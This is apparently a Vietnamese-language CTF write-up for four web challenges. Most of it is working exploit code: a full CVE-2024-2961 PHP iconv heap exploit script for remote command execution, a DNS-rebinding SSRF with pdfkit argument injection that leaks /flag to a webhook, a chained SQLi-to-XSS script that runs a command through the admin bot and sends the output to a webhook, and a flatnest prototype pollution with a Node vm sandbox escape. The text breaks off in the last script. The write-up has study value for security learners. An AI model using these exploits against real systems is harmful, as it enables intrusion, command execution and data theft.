---
title: 0xNote

---

# 0xNote

![image](https://hackmd.io/_uploads/ryOk1sVIWx.png)
## Overview 
- Backend : **fpm**
![image](https://hackmd.io/_uploads/SJSBJj4U-l.png)
- Proxy : **nginx** 
![image](https://hackmd.io/_uploads/HkQCko4LZl.png)
- Giao diện 
![image](https://hackmd.io/_uploads/SkCqlsE8be.png)
- Tuy nhiên bị chặn ở `/premium.php` 
## Solve 

- Với cách viết proxy như sau ta có thể bypass bằng việc thêm `index.php` ngay sau thư mục mà ta bị chặn (`premium.php`)
![image](https://hackmd.io/_uploads/BkGVeoVI-x.png)
- [Cách bypass ở đây](https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm)
- Sau khi vào được `/premium.php` bằng `/premium.php/index.php` ta thấy được ứng dụng set color không fillter input người dùng 
- Như đoạn code sau nếu có thể kiểm soát được `color` và `note` thì có thể tạo ra 1 object mới : 
![image](https://hackmd.io/_uploads/rkKAWiNL-e.png)

## Exploit 
- CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì 
- Set path : `php://filter/convert.base64-encode/resource=/etc/passwd`
![image](https://hackmd.io/_uploads/Sy_7VjNUZx.png)
- Set Classname 
![image](https://hackmd.io/_uploads/H1PwVjEIWl.png)
- Đọc kết quả 
![image](https://hackmd.io/_uploads/rkbq4sV8Wx.png)
- Auket lấy được `etc/passwd` tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc 
![image](https://hackmd.io/_uploads/rJzRNiVUZg.png)
### Nâng quyền 
- Ngay khi thực hiện được `SPLFileObject` như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ [đoạn tài liệu sau](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py) và [cái này](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html)
![image](https://hackmd.io/_uploads/SJfsHsVIZl.png)
- Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào `http://localhost:5000/` để check id 
```php=
import requests
from pwn import *
import re
import base64
import zlib
from bs4 import BeautifulSoup

session = requests.Session()

## Constant

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")

## Post init function

def get_file(url, path):
    path = f"php://filter/convert.base64-encode/resource={path}"
    r = session.post(url + 'login.php', data={'username':'winky'})
    r = session.post(url + 'index.php', data={'note':path})
    r = session.post(url + '/premium.php/index.php', data={'color': 'SplFileObject'})
    r = session.get(url + 'index.php')
    soup = BeautifulSoup(r.text, "html.parser")
    data = soup.find("div", id="noteContent").get_text(strip=True)
    return base64.b64decode(data)

def compress(data):
    return zlib.compress(data, 9)[2:-4]

def compressed_bucket(data):
    return chunked_chunk(data, 0x8000)

def qpe(data):
    return "".join(f"={x:02x}" for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None):
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)
    return bucket

def chunked_chunk(data, size: int = None):
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"

## Pwn core

class PWN_Core():
    def __init__(self, url, command) -> None:
        self.url = url
        self.command = command
        self.info = {}
        self.heap = None
        self.pad = 20
        
    class Region():
        def __init__(self, start, stop, permissions, path):
            self.start = int(start)
            self.stop = int(stop)
            self.permissions = permissions
            self.path = path
        
        @property
        def size(self) -> int:
            return self.stop - self.start
    
    def download_file(self, remote_path: str, local_path: str) -> None:
        data = get_file(self.url, remote_path)
        Path(local_path).write_bytes(data)
    
    def get_regions(self):
        maps = get_file(self.url, "/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in [line.strip() for line in maps.strip().split('\n')]:
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = self.Region(start, stop, permissions, path)
                regions.append(current)
                
            else:
                print(maps)
        return regions

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        for region in regions:
            if any(name in region.path for name in names):
                break
        return region

    def find_main_heap(self, regions):
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]
        first = heaps[0]
        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
        return first

    def get_symbols_and_addresses(self) -> None:
        regions = self.get_regions()
        LIBC_FILE = "./libc"
        self.info["heap"] = self.find_main_heap(regions)
        libc = self._get_region(regions, "libc-", "libc.so")
        self.download_file(libc.path, LIBC_FILE)
        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def build_exploit_path(self):
        
        self.get_symbols_and_addresses()
        
        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]
        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
        CS = 0x100

        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)
        
        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS
        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)
        
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )
        
        step4_use_custom_heap_size = 0x140
        
        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
        
        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )
        
        resource = compress(compress(pages))
        resource = base64.b64encode(resource).decode()
        resource = f"data:text/plain;base64,{resource}"
        
        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"
        return path

def solve():
    URL = 'http://localhost:5000/'
    
    command = 'id > /tmp/check_id'
    
    print(f'[+] Build payload với lệnh: {command}')
    path = PWN_Core(URL, command).build_exploit_path()
    
    # 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)
    try:
        print('[*] Đang gửi payload kích hoạt RCE...')
        # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi
        # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi
        
        # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file
        exploit_payload = f"php://filter/convert.base64-encode/resource={path}"
        session.post(URL + 'login.php', data={'username':'winky'})
        session.post(URL + 'index.php', data={'note': exploit_payload})
        session.post(URL + '/premium.php/index.php', data={'color': 'SplFileObject'})
        session.get(URL + 'index.php', timeout=5) # Kích hoạt exploit
        
    except Exception as e:
        # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)
        print(f'[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}')
    
    # 3. Đợi hệ thống đồng bộ file
    import time
    print('[*] Đợi 2 giây để lệnh thực thi xong...')
    time.sleep(2)
    
    # 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)
    print('[*] Đang đọc kết quả từ /tmp/check_id...')
    try:
        # Dùng chính tính năng SplFileObject để đọc file kết quả
        result = get_file(URL, "/tmp/check_id")
        
        if result:
            print('\n[+] KẾT QUẢ COMMAND ID:')
            print('='*40)
            print(result.decode('utf-8').strip())
            print('='*40)
        else:
            print('[-] Không đọc được kết quả. Có thể exploit chưa thành công.')
            
    except Exception as e:
        print(f'[-] Lỗi khi đọc file kết quả: {e}')

if __name__ == "__main__":
    solve()
```

![image](https://hackmd.io/_uploads/SyU18T4I-g.png)

- Bây giờ để lấy flag cần sử dụng binary `/readflag`. Trong Dockerfile binary này đã được cấp quyền `SUID` tức là khi user `nobody` chạy nó, nó sẽ thực thi với quyền của chủ sở hữu file (là root)

```php=
def solve():
    URL = 'http://localhost:5000/'
    
    # Output được ghi vào /tmp/flag_result để user nobody có thể đọc lại sau đó
    command = '/readflag > /tmp/flag_result'
    
    print(f'[+] Đang tạo payload cho lệnh: {command}')
    
    path = PWN_Core(URL, command).build_exploit_path()
    
    # 1. Gửi Exploit (Trigger RCE)
    try:
        print('[*] Đang gửi payload kích hoạt RCE...')
        # Gửi request để kích hoạt lỗi iconv, server dự kiến sẽ crash (trả về 502)
        encoded_path = f"php://filter/convert.base64-encode/resource={path}"
        session.post(URL + 'login.php', data={'username':'winky'})
        session.post(URL + 'index.php', data={'note': encoded_path})
        session.post(URL + '/premium.php/index.php', data={'color': 'SplFileObject'})
        session.get(URL + 'index.php', timeout=5)
    except Exception as e:
        print(f'[!] Server đã crash/phản hồi (Dấu hiệu tốt): {e}')
    
    # 2. Đợi hệ thống xử lý
    import time
    print('[*] Đợi 2 giây để lệnh /readflag thực thi xong...')
    time.sleep(2)
    
    # 3. Đọc kết quả từ file tạm bằng kỹ thuật LFI cũ
    print('[*] Đang đọc flag từ /tmp/flag_result...')
    try:
        # Sử dụng lại hàm get_file (SplFileObject) để đọc file kết quả
        flag = get_file(URL, "/tmp/flag_result")
        
        if flag:
            print('\n' + '='*40)
            print(f"FLAG: {flag.decode('utf-8', errors='ignore').strip()}")
            print('='*40 + '\n')
        else:
            print('[-] Không đọc được flag. Có thể exploit thất bại hoặc file không tồn tại.')
            
    except Exception as e:
        print(f'[-] Lỗi khi đọc file flag: {e}')

if __name__ == "__main__":
    solve()
```

![image](https://hackmd.io/_uploads/Sk4YUaELbg.png)

**Flag: 0xL4ugh{1think_y0u_l0ved_my_pHp_n0te_e1bfd312v_dc754541a1d6a4fd}**

# pdf.exe

![image](https://hackmd.io/_uploads/Sy8Srer8-e.png)

## Overview 
- **DNS Rebinding SSRF** in Next.js Image Optimizer để chạm tới dịch vụ nội bộ 
- **CRLF Injection** in Python's `urllib.request` `data:` URI handler để chèn header độc hại vào gói tin 
- **pdfkit Argument Injection** via **injected HTML meta tags** để lấy được nội dung của flag từ dịch vụ nội bộ 

## Next.js Image Optimizer SSRF
- Trước tiên ta sẽ gặp được cấu hình file `next.config.ts` như sau : 
![image](https://hackmd.io/_uploads/r1IpmXdU-g.png)
=>  Willcard `hostname: "**"` cho phép tối ưu hình ảnh từ việc lấy ảnh từ bất kì host `HTTP` nào 
=> Đối với endpoint `/_next/image` nếu kiểm soát được `url` ta có thể **SSRF** vào dịch vụ nội bộ 

- Đối với endpoint `/_next/image` chấp nhạn 3 tham số 


| Tham số  | Chức năng                 |
| -------- | --------                  | 
|  url     | Url của ảnh và tối ưu     |
|  w       | Chiều rộng mong muốn      |
|  q       | Số lượng                  |

- Request sẽ như sau : `GET /_next/image?url=https://example.com/photo.jpg&w=640&q=75`
- Thực hiện SSRF cổ điển như sau `GET /_next/image?url=http://127.0.0.1:5000/generate&w=640&q=75` nhưng đương nhiên sẽ bị chặn 
- Giờ đến lúc đâm sâu vào src với [hàm `fetchExternalImage`](https://github.com/vercel/next.js/blob/canary/packages/next/src/server/image-optimizer.ts) 
- Hàm này sẽ có chức năng như sau : 
    - Parse hostname từ ip 
    - Resolve DNS để chuyển về ip 
    - Kiểm tra xem có phải ip nội bộ không 
    - Nếu là IP nội bộ thì chặn 
    - Còn nếu không thì cho qua 

- Auke đây sẽ là lúc Time-of-Check to Time-of-Use **(TOCTOU)**
- Thời gian server kiểm tra ip riêng sẽ là lúc ta thực hiện request đến mục tiêu 
- Sử dụng cái này để [DNS rebinding](https://lock.cmpxchg8b.com/rebinder.html)
- You control a domain 
- The DNS server is configured with a very low TTL and alternates responses:
    - First query -> 1.2.3.4 (public IP, passes validation)
    - Second query -> 127.0.0.1 (private IP, actual target)
- Image optimizer:
    - Resolves evil.mushroom.cat -> 1.2.3.4 ✅ (validation passes)
    - Calls fetch(evil.mushroom.cat) -> DNS resolves again -> 127.0.0.1 Request hits localhost! ✅✅✅✅
- URl sẽ như sau `GET /_next/image?url=http://7f000001.8efab5ae.rbndr.us:5000/generate?data=...&w=640&q=75`
![image](https://hackmd.io/_uploads/SJpe1LdLZl.png)

## Python urllib CRLF Injection in (`data:`) URIs
- Như ta thấy dataURI được ta kiểm soát hoàn toàn và nó chỉ fillter đơn giản bới `data_uri.startswith("data:plain/text"):` kiểm tra xem có bắt đầu chuỗi bằng `data:plain/text` không . 
![image](https://hackmd.io/_uploads/rySheLdIbe.png)

- Ngay sau đó `datauri` sẽ rơi vào `urlopen` và `Python's urllib.request` sẽ xứ lí `data: URIs` through the `DataHandler class`.
![image](https://hackmd.io/_uploads/HJ-VbLd8bg.png)

- `Data:` URI  sẽ có dạng `data:[<mediatype>][;base64],<data>`
- Hàm `email.message_from_string()` xử lí headers. Headers được tách bới newline (`\r\n` or  `\n`). Vậy nên ta chèn (`%0A`) vào phần mediatype

```code=
data:plain/text%0AContent-Disposition: malicious-header,mushroom

    ||
    ||
    \/
Content-Type: plain/text
Content-Disposition: malicious-header
```

- Chúng ta sẽ chèn vào header `Content-Disposition` bới nó sẽ được đưa vào pdfkit lúc sau 

## pdfkit Argument Injection (The Flag Exfiltration)

- pdfkit là tool để chuyển từ HTML sang pdf 
- Chúng ta có thể inject vào 1 đoạn html để lợi dụng 1 số chức năng để đọc flag
![image](https://hackmd.io/_uploads/rkmt4UuU-l.png)

- Như vậy payload sẽ như sau : 
```code=
<meta name="pdfkit-post-file" content="">
<meta name="pdfkit-leak-data" content="/flag">
<meta name="pdfkit-https://webhook.site/XXXX/" content="--cache-dir">
```

- Payload sẽ được hình dung như sau : 
![image](https://hackmd.io/_uploads/S1HmdI_IWx.png)
- Double encode url ta được payload ⬇️
## Final exploit 
```code=
import requests
import time

paylaod = "http%3A%2F%2F7f000001.8efac8ce.rbndr.us%3A5000%2Fgenerate%3Fdata%3Ddata%3Aplain%2Ftext%250AContent-Disposition%3A%253Cmeta%2520name%3D%2522pdfkit-post-file%2522%2520content%3D%2522%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-leak-data%2522%2520content%3D%2522%2Fflag%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-https%3A%2F%2Fwebhook.site%2F1738ce87-4a08-47ae-9cd5-323dc449cb7d%2F%3Fq%3D--%2522%2520content%3D%2522--cache-dir%2522%253E%2Ccanelo"

r =  f"http://165.227.157.69/_next/image?url={paylaod}&w=256&q=75&"

print("Attack started check your webhook")

while True:
    _ = requests.get(r)
    time.sleep(0.1)
```

![image](https://hackmd.io/_uploads/SkZfrUOUbl.png)

- LƯU Ý : chall này không thực hiện được trên local bới đặc tính của NextJS 
**FLAG : 0xL4ugh{my_pdfs_are_something_else_right?_179453d559cb1bec}**





# Smol Web
![image](https://hackmd.io/_uploads/SyeNttP8bx.png)
![image](https://hackmd.io/_uploads/r1nQ0FvLWl.png)


## Phân tích
- web service (port 5000): xem và đánh giá sản phẩm
- bot service (port 3000): admin bot sử dụng puppeteer để visit URL được report

### `app/Dockerfile`
- Flag nằm trong biến môi trường, chỉ có thể đọc qua binary `/readflagbinary` (được set quyền SUID) => RCE

### `app/main.py`
- endpoint `/ratings` lấy tham số `quantity` và đưa trực tiếp vào lệnh SQL qua `f-string`
![image](https://hackmd.io/_uploads/H1PEk5v8Wg.png)

- Có filet `'` và `"` nhưng vì đây là interger nên không cần dấu nháy để injection

- Sau khi query bảng `products` code lấy `user_id` từ kết quả để query bảng `users`
![image](https://hackmd.io/_uploads/HkmQxqD8-x.png)
- `r['user_id']` là dữ liệu ta control được từ câu query trên
- Tại `templates/ratings_page.html` creator được render với filter `safe`:
![image](https://hackmd.io/_uploads/BkN_x9PI-x.png)

=> Chain: inject payload vào cột `user_id` ở query 1 -> payload đó trở thành câu SQL query 2 -> trả về XSS payload vào biến `name` -> render ra HTML

### Endpoint /search (chỉ access được từ localhost (từ phía bot)
![image](https://hackmd.io/_uploads/SkgxZcwLWx.png)

- Hàm `sanitize_input` chặn nhiều ký tự và các lệnh ![image](https://hackmd.io/_uploads/ryxSbcwIWe.png)
- Nhưng `find` command có tuỳ chọn `-exec` => cần bypass filter để chạy `/readflagbinary`

## Vuln
1. **SQL Injection (stage 1)**: inject còn `quantity` để control cột `user_id` trả về
2. **SQLi (stage 2)**: sử dụng giá trị `user_id` độc hại để Union Select ra payload XSS
3. **Reflected XSS**: payload XSS hiển trị trên trang `/ratings`
4. **CSP bypass** sử dụng JSONP endpoint của youtube (`/oembed`) để execute JS
5. **SSRF/local access**: dùng bot để trigger request tới `/search` (endpoint nội bộ)
6. **Command Injection**: inject tham số cho lẹnh `find` để thực thi `/readflagbinary`

## Exploit
### Bypass filter và payload encoding
- Do `quantity` chặn dấu nháy `'` nên không thể viết string trực tiếp => Dùng hàm `CHAR(ascii_code)` của SQLite và nối chuỗi bằng `||`

### Tạo payload XSS để bypass CSP
- không thể dùng `<script>alert(1)</script>` => dùng gadget youtube
`<script src="https://www.youtube.com/oembed?callback=...Javascript..."></script>`
- Đoạn JS trong callback sẽ:
    - Tạo `XMLHttpRequest` POST tới `/search`
    - Gửi body: `search=-exec /*e*b*y ;`
    - Đọc response (output của lệnh `find`)
    - Gửi flag về webhook qua `location`

### Bypass filter tại `/search`
- Lệnh cần chạy: `/readflagbinary`. Filter block: `r, l, f, a, d...` . Filter allow: `e, b, y, *, /` Payload: `/*e*b*y` 
    - `/` : Root
    - `*` : match `readflag`
    - `b` : match `b`
    - `*` : match `inar`
    - `y` : match `y` => find sẽ execute: `/readflagbinary`

### Chain SQLi
- Ta cần nhúng XSS payload vào `user_name`
    - query 2 (inner): `0 UNION SELECT 1, '<script...XSS...>'`
    - query 1 (outer): `quantity = 0 UNION SELECT 1, 2, 3, (payload query 2 đã encode CHAR)`

- Khi server chạy:
    - query 1 trả về `user_id` là chuỗi SQL `"0 UNION SELECT..."`
    - query 2 chạy: `SELECT ... WHERE id = 0 UNION SELECT 1, '<script...>'`
    - User name là đoạn script
    - HTML render đoạn script -> Bot chạy script -> RCE -> Lấy Flag

## Full script:
```python
import urllib.parse
import requests

# [CONFIG] Thay đổi URL target và Webhook của bạn
TARGET_URL = "http://challenges2.ctf.sd:35129"
WEBHOOK = "https://webhook.site/0c04e078-b97c-4c59-82a9-fc5f06f2eea8" # Thay bằng webhook của bạn

def to_char(s):
    """
    Chuyển đổi string sang dạng SQLite CHAR() để bypass filter dấu nháy (')
    Ví dụ: 'ABC' -> CHAR(65,66,67)
    """
    chars = [str(ord(c)) for c in s]
    chunks = []
    # Chia nhỏ để tránh giới hạn tham số nếu có
    for i in range(0, len(chars), 40):
        chunk = ",".join(chars[i:i+40])
        chunks.append(f"CHAR({chunk})")
    return "||".join(chunks)

def generate_payload():
    print("[*] Generating Exploit Payload...")

    # 1. Javascript Payload: Chạy trên browser của Bot
    # Nhiệm vụ: POST vào /search để kích hoạt Command Injection, sau đó gửi kết quả về Webhook
    # Payload cmd injection: -exec /*e*b*y ;  (Tương đương: -exec /readflagbinary ;)
    js_code = (
        "var xhr=new XMLHttpRequest();"
        "xhr.open('POST','/search',true);"
        "xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');"
        "xhr.onload=function(){"
            "var d=new DOMParser().parseFromString(xhr.responseText,'text/html');"
            "var output=d.querySelector('pre').textContent;"
            "location='" + WEBHOOK + "?flag='+btoa(output)" 
        "};"
        "xhr.send('search=-exec /*e*b*y ;');"
    )
    
    # Encode JS để nhúng vào callback của Youtube
    encoded_js = urllib.parse.quote(js_code)
    
    # 2. XSS Payload: Bypass CSP bằng Youtube Oembed
    xss_tag = f'<script src="https://www.youtube.com/oembed?callback={encoded_js}"></script>'

    # 3. Inner SQL Injection (Query 2): Để inject XSS vào tên user
    # Cấu trúc: 0 UNION SELECT 1, 'PAYLOAD_XSS'
    inner_sqli = f"0 UNION SELECT 1,'{xss_tag}'"
    
    # Encode Inner SQLi sang CHAR() để tránh dấu nháy trong Outer SQLi
    char_payload = to_char(inner_sqli)
    
    # 4. Outer SQL Injection (Query 1): Inject vào tham số quantity
    # Cột thứ 4 là user_id, ta nhét payload inner vào đây
    final_sqli = f"0 UNION SELECT 1,2,3,{char_payload}"
    
    print(f"[+] Final Payload (for quantity param):\n{final_sqli}")
    return final_sqli

def send_exploit(payload):
    # Đường dẫn mà Bot sẽ visit. 
    # Bot sẽ truy cập: http://web:5000/ratings?quantity=...
    path_to_visit = f"/ratings?quantity={urllib.parse.quote(payload)}"
    
    report_url = f"{TARGET_URL}/report"
    print(f"[*] Sending report to: {report_url}")
    print(f"[*] Bot will visit: {path_to_visit}")

    try:
        r = requests.post(report_url, data={"url": path_to_visit})
        if r.status_code == 200:
            print("[+] Report sent successfully! Check your webhook.")
            print(f"[>] Webhook URL: {WEBHOOK}")
        else:
            print(f"[-] Failed to send report. Status: {r.status_code}")
            print(r.text)
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    payload = generate_payload()
    send_exploit(payload)
```
![image](https://hackmd.io/_uploads/Bkzjv9wLWe.png)
![image](https://hackmd.io/_uploads/BywsPcvIbl.png)

# 4llD4y
![image](https://hackmd.io/_uploads/rJFMR4_IZg.png)
![image](https://hackmd.io/_uploads/rydEC4OUWx.png)

## Phân tích
- Flag được ghi vào một file có tên `/flag_xxxxx.txt` (nằm ở root `/`)
- biến môi trường `$FLAG` bị unset -> RCE để list file trong `/` và đọc

### app.js
![image](https://hackmd.io/_uploads/HyCx1H_8-e.png)

- Sử dụng `express` và `happy-dom`
- endpoint `/config` (POST)
    - Nhận JSON input
    - sử dụng thư viện `flatnest` hàm `nest()` để xử lý object đầu vào 
- endpoint `/render` (POST)
    - nhận `html` string
    - khởi tạo `new Window()` từ `happy-dom`
    - ghi HTML vào document và trả về `outerHTML`
    => Nơi ta execute XSS/JS nhưng mặc định `happy-dom` sẽ tắt execute JS 
    
## Vuln
**1. prototype pollution trong flasnest (CVE-2023-26135)** 
- ![image](https://hackmd.io/_uploads/Hkx1lBuLWe.png)
- Thư viện `flatnest` (v1.0.1) unflatten một object (chuyển key dạng dot-notation `x.y` thành nested object `{x: {y: ...}}`)
- Nhưng nó không lọc các key như `__proto`, `constructor`, `prototype`
- Các payload kiểu cũ `{"__proto__": {"settings": ...}}` -> fail vì `flatnest` sẽ lọc key này
- `flatnest` có một tính năng đặc biệt để hỗ trợ Circular References -> cho phép định nghĩa một chuỗi đặc biệt để trỏ ngược lại object cha
([có tham tham khảo ở đây](https://github.com/brycebaril/node-flatnest/blob/b7d97ec64a04632378db87fcf3577bd51ac3ee39/nest.js))
- `flatnest` parse chuỗi có định dạng `[Circular (path)]`
- nó không validate `path` bên trong `Circular`
- khi ta gửi `"[Circular (__proto__)]"` `flatnest` sẽ phân giải nó và trỏ thẳng vào `Object.prototype` của object hiện tại mà không bị filter key chặn
**2. sandbox escapse/RCE trong happy-dom**
-  khi `enableJavaScriptEvaluation` được bật -> tag `script` trong HTML gửi lên sẽ được execute
-  Vì chạy trong cùng context với note process nên ta có thể dùng `this.constructor.constructor` để lấy `Function` constructor gốc -> gọi ra `process` của nodejs và rce

## Exploit
### prototype pollution
- Dùng `nest()` tại `/config` để pollution `Object.prototype.settings`
``` json
{
    "polluter": "[Circular (__proto__)]",
    "polluter.settings": {},
    "polluter.settings.enableJavaScriptEvaluation": true
}
```
- `flatnest` gán `obj.polluter = obj.__proto__` (tức là `Object.prototype`)
- Nó gán `obj.polluter.settings.enableJavaScriptEvaluation = true`
<=> `Object.prototype.settings = { enableJavaScriptEvaluation: true }`

### RCE
#### sandbox escapse
- sau khi pollute và trả về `{ message: 'configuration applied' }` 
- `happy-dom` sử dụng `vm` module của node.js để chạy script trong tag `<script>`
- `vm` không phải là security sandbox. Context bên trong `vm` vẫn có thể truy cập vào constructor của các object cơ bản ( `Object`, `Function`)
- ta dùng `this.constructor.constructor` (trong đó `this` là window/global scope của VM) sẽ trả về `Function` constructor của host process (node.js chính) cho phép ta thoát khỏi VM context và execute code
#### internal binding
- `process.binding('spawn_sync')` là internal API của node.js được dùng bởi `child_process`. Dùng cái này để bypass nếu module `child_process` bị override hoặc filter, và nó khá ổn để spawn process con (như `/bin/ls` hay `/bin/cat`) trực tiếp

```javascript!
// thoát sandbox, lấy object process của node.js
const process = this.constructor.constructor("return process")();

// lấy internal binding để spawn process
const spawn = process.binding("spawn_sync");

// Cấu hình lệnh
const opts = {
    file: "/bin/ls",
    args: ["ls", "/"],
    envPairs: [],
    stdio: [
        {type:"pipe",readable:true,writable:false},
        {type:"pipe",readable:false,writable:true},
        {type:"pipe",readable:false,writable:true}
    ]
};

// excecute và lấy output
const result = spawn.spawn(opts);

// trả kết quả về client bằng cách ghi đè document body
document.body.innerHTML = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
```

- Sử dụng lệnh `ls /` để xem tên file flag_*.txt
![image](https://hackmd.io/_uploads/BkaRYhOIWl.png)

- Sau khi tìm được tên flag flag thì thay phần cấu hình thành lệnh cat:
```javascript
...
const opts = {
    file: "/bin/cat",
    args: ["cat", "/flag_510a85c2731f7e49.txt"],
    envPairs: [],
    stdio: [
        {type:"pipe",readable:true,writable:false},
        {type:"pipe",readable:false,writable:true},
        {type:"pipe",readable:false,writable:true}
    ]
};
...
```
![image](https://hackmd.io/_uploads/HyJI92O8-g.png)


## Full script exploit
```python
import requests
import json

# Target config
TARGET_URL = "http://challenges2.ctf.sd:35309" # Đổi IP nếu cần
CMD_TO_RUN = "cat /flag_*.txt" # Lệnh cần chạy để lấy flag

def exploit():
    # Session để giữ kết nối tốt hơn
    s = requests.Session()

    print("[+] Step 1: Performing Prototype Pollution on flatnest...")
    
    # Payload abuse tính năng Circular Reference của flatnest
    # polluter -> Object.prototype
    pollution_payload = {
        "polluter": "[Circular (__proto__)]",
        "polluter.settings": {},
        "polluter.settings.enableJavaScriptEvaluation": True
    }
    
    try:
        r1 = s.post(
            f"{TARGET_URL}/config",
            json=pollution_payload,
            headers={"Content-Type": "application/json"}
        )
        print(f"[*] Pollution Response: {r1.text}")
    except Exception as e:
        print(f"[!] Error sending pollution: {e}")
        return

    print("[+] Step 2: Triggering RCE via Happy DOM...")
    
    # Payload Javascript độc hại để escape sandbox và chạy lệnh hệ thống
    # Dùng process.binding('spawn_sync') để chạy lệnh shell
